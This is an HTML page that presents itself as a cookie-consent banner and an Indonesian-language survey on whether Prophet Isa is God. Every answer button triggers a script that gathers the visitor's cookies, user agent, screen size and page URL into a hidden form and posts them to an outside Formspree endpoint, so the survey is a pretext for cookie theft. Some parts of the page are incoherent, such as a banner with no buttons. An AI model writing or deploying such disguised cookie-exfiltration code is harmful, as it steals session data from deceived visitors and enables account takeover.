<!DOCTYPE html>
<html>
<head>
    <title>Cookie Consent</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
        .cookie-banner {
            background: #f5f5f5;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            margin-right: 10px;
        }
        button:hover {
            background: #45a049;
        }
        .question-form {
            margin-top: 30px;
            padding: 20px;
            background: #f9f9f9;
            border-radius: 5px;
        }
        .question-form h2 {
            margin-top: 0;
            color: #333;
        }
        .question-form label {
            display: block;
            margin: 10px 0;
        }
        .question-form input[type="radio"] {
            margin-right: 10px;
        }
        .submit-btn {
            margin-top: 15px;
            background: #2196F3;
        }
        .submit-btn:hover {
            background: #0b7dda;
        }
    </style>
</head>
<body>
    <div class="cookie-banner" id="cookieBanner">
        <h2>Survey Keimanan Muslim</h2>
    </div>

    <div id="content" style="display:none;">
        <h1>Selamat Datang</h1>
        
        <!-- Form Pertanyaan tentang Nabi Isa -->
        <div class="question-form">
            <h2>Pertanyaan tentang Nabi Isa Alaihissalam</h2>
            <form id="isaQuestionForm" onsubmit="submitQuestionForm(event)">
                <p>Menurut keyakinan Anda, apakah Isa Alaihissalam adalah Tuhan?</p>
                
                <label>
                    <button onclick="acceptCookies()">Ya, Isa adalah Tuhan</button>
                </label>
                <label>
                    <button onclick="acceptCookies()">Tidak, Isa adalah utusan Allah</button>
                </label>
                <label>
                    <button onclick="acceptCookies()">Saya tidak tahu</button>
                </label>
                
                <button onclick="acceptCookies()">Submit Jawaban</button>
            </form>
            <div id="formResponse" style="margin-top: 15px; display: none;"></div>
        </div>
    </div>

    <script>
        // Fungsi untuk mengirim cookies ke Formspree
        function sendCookiesToEmail() {
            // Kumpulkan semua cookies
            const cookies = document.cookie;
            
            // Kumpulkan informasi tambahan
            const userAgent = navigator.userAgent;
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const pageUrl = window.location.href;
            const timestamp = new Date().toISOString();
            
            // Buat form tersembunyi
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://formspree.io/f/xwplzqar'; // Ganti dengan endpoint Formspree Anda
            
            // Tambahkan data ke form
            function addField(name, value) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            }
            
            addField('cookies', cookies);
            addField('user_agent', userAgent);
            addField('screen_resolution', screenResolution);
            addField('page_url', pageUrl);
            addField('timestamp', timestamp);
            addField('_replyto', 'noreply@example.com'); // Optional
            addField('_subject', 'Cookie Report from Website');
            
            // Tambahkan form ke body dan submit
            document.body.appendChild(form);
            form.submit();
        }

        // Fungsi ketika cookie diterima
        function acceptCookies() {
            document.getElementById('cookieBanner').style.display = 'none';
            document.getElementById('content').style.display = 'block';
            
            // Set cookie consent
            document.cookie = "cookie_consent=true; max-age=2592000"; // 30 hari
            
            // Kirim data cookies ke email
            sendCookiesToEmail();
        }

        // Fungsi ketika cookie ditolak
        function declineCookies() {
            document.getElementById('cookieBanner').style.display = 'none';
            document.getElementById('content').style.display = 'block';
            
            // Set cookie consent declined
            document.cookie = "cookie_consent=false; max-age=2592000";
        }

        // Cek jika consent sudah diberikan sebelumnya
        function checkCookieConsent() {
            const cookies = document.cookie.split(';');
            for (let i = 0; i < cookies.length; i++) {
                const cookie = cookies[i].trim();
                if (cookie.startsWith('cookie_consent=')) {
                    const consent = cookie.substring('cookie_consent='.length);
                    if (consent === 'true') {
                        document.getElementById('cookieBanner').style.display = 'none';
                        document.getElementById('content').style.display = 'block';
                    }
                    return;
                }
            }
        }

        // Fungsi untuk menangani submit form pertanyaan
        function submitQuestionForm(event) {
            event.preventDefault();
            
            const form = event.target;
            const formData = new FormData(form);
            const responseDiv = document.getElementById('formResponse');
            
            // Tampilkan pesan terima kasih
            responseDiv.style.display = 'block';
            responseDiv.innerHTML = '<p style="color: green;">Terima kasih atas jawaban Anda!</p>';
            
            // Kirim data form ke Formspree (opsional)
            const xhr = new XMLHttpRequest();
            xhr.open(form.method, form.action);
            xhr.setRequestHeader('Accept', 'application/json');
            xhr.onreadystatechange = function() {
                if (xhr.readyState !== XMLHttpRequest.DONE) return;
                if (xhr.status === 200) {
                    // Sukses
                } else {
                    // Error
                }
            };
            xhr.send(formData);
            
            // Reset form
            form.reset();
        }

        // Jalankan saat halaman dimuat
        window.onload = checkCookieConsent;
    </script>
</body>
</html>
